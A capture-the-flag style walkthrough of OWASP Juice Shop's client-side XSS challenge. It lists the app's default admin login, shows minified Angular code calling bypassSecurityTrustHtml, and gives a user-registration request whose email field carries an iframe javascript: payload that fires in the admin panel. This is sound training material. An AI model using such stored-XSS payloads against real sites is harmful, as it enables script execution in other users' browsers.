# Client-Side XSS Protection

**Description**
Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism.

Topics: Danger Zone
Type: XSS

## Solution

Quick recap, what is a persisted XSS attack.
A persistent (stored) XSS attack is a type of Cross-Site Scripting vulnerability where malicious script gets permanently saved on a target server — like in a database, comment field, forum post, or user profile — and then served to other users whenever they view that content.

And what are "client-side protection mechanism"

1. Output encoding / Escaping
2. Safe DOM API, like `textContent` / `innerText` instead of `innerHTML` (Avoid `document.write`, `eval` and etc...)
3. Content Security Policy (CSP) - An `HTTP` response header that tells the browser which sources of scripts, style, images and etc. Are allowed to load or execute. Block `js` functions like `eval` or `inline` scripts
4. Framework Auto-Escaping
5. HTML Sanitization Libraries
6. Cookie Protections - `HttpOnly` flag on `cookie` prevents `JS` from accessing it via `document.cookie`. `SameSite` restrict the browser for sending the cookies to different origins.
There are many more tricks, these are the "KEY" ones.

### Thought Process

Due to this needed to be "persistent" we must find some kind of place were we as users can "upload DATA".
First we will login in as admin (`admin@juice-sh.op`:`admin123`)

#### Upload an `review` for a `product`

First query product list via `GET /rest/products/search`

To "upload" a new product just send a `PUT /rest/products/1/reviews` (Payload is a simple `message` and `author` json)

To view the response we must re-query the `reviews` by doing `GET /rest/products/1/reviews`.
To understand better "who" uses this API call I will open a `DevTools`..!
View "main-js-breakpoint.png"

Later we can see this line:

```javascript
this.reviews$ = this.productReviewService.get(this.data.productData.id),
```

Played with it but couldn't find any usage for this "content", maybe I don't know web-dev enough

#### Upload "Complaint"

Couldn't find a place in which we receive the "complaint".

#### Put Customer Feedback

First we must upload a new customer feedback

```bash
POST /api/Feedbacks/
```

To retrieve the feedbacks you must send a `GET /api/Feedbacks/` and the data received is in `JSON`.

At the `front` side we found a function named `findAllFeedbacks()` at file `main.js`

Here is the comment code:

```javascript
findAllFeedbacks() {
    this.feedbackService.find().subscribe({
        next: e => {
            this.feedbackDataSource = e;
            for (let i of this.feedbackDataSource)
                i.comment = this.sanitizer.bypassSecurityTrustHtml(i.comment);
            this.feedbackDataSource = new Ht(this.feedbackDataSource),
            this.feedbackDataSource.paginator = this.paginatorFeedb,
            this.resultsLengthFeedback = e.length
        }
        ,
        error: e => {
            this.error = e,
            console.log(this.error)
        }
    })
}
```

Hoppa, what is this `this.sanitizer.bypassSecurityTrustHtml` function!!

Put a breakpoint on the the `bypassSecurityTrustHtml(i.comment);` line and modifies `i.comment` to be an XSS payload!
It worked! we have a POC, now we must put this POC to action!
View "dev-tools-console.png" image

So let upload a "shitty ;)" feedback...

Ok tried it via the `/api/Feedbacks/` (POST) request, it didn't fucking worked!! Empty output!

#### Upload a Product

We might be able to upload a product, this will require direct usage of API but I believe in us...

```bash
`GET /rest/products/search`
```

Also we might want to first "review" how the product description & name are being "rendered!"

```javascript
var ji = ( () => {
    class t {
        http = m(ue);
        hostServer = J.hostServer;
        host = this.hostServer + "/api/Products";
        search(e) {
            return this.http.get(`${this.hostServer}/rest/products/search?q=${e}`).pipe(W(i => i.data), L(i => {
                throw i
            }
            ))
        }
        find(e) {
            return this.http.get(this.host + "/", {
                params: e
            }).pipe(W(i => i.data), L(i => {
                throw i
            }
            ))
        }
        get(e) {
            return this.http.get(`${this.host}/${e}?d=${encodeURIComponent(new Date().toDateString())}`).pipe(W(i => i.data), L(i => {
                throw i
            }
            ))
        }
        put(e, i) {
            return this.http.put(`${this.host}/${e}`, i).pipe(W(n => n.data), L(n => {
                throw n
            }
            ))
        }
        static \u0275fac = function(i) {
            return new (i || t)
        }
        ;
        static \u0275prov = U({
            token: t,
            factory: t.\u0275fac,
            providedIn: "root"
        })
    }
    return t
}
```

Then I found some few more interesting functions (at main)

like

```javascript
trustProductDescription(e) {
    for (let i = 0; i < e.length; i++)
        e[i].description = this.sanitizer.bypassSecurityTrustHtml(e[i].description)
}
```

As we already know the `this.sanitizer.bypassSecurityTrustHtml` does absolutely nothing that blocks an JS iframe

For devconsole it really worked, Now we must find a way to either edit a description or

Then I remembered that it's the solution for `API-only XSS`

Gave up

### Looked at Solution

Copied what is thought here: `https://youtu.be/bNjsjs0T0_k?si=Y_2K4MIb_b4qtM9w`

It suggested to register a user via `POST /api/Users/`.

So let register (via `repeater` due to the uer restriction )

So I sent a `POST /api/Users` with payload:

```json
{
  "email":"<iframe src=\"javascript:alert(`xss`)\">",
  "password":"12345",
  "passwordRepeat":"12345",
  "securityQuestion":{
    "id":1,
    "question":"Your eldest siblings middle name?",
    "createdAt":"2026-06-26T09:11:23.175Z",
    "updatedAt":"2026-06-26T09:11:23.175Z"
  },
  "securityAnswer":"1"
}
```

So when you log in as `admin@juice-sh.op` and goes to `/#/administration` and boom. XSS pop-ups!
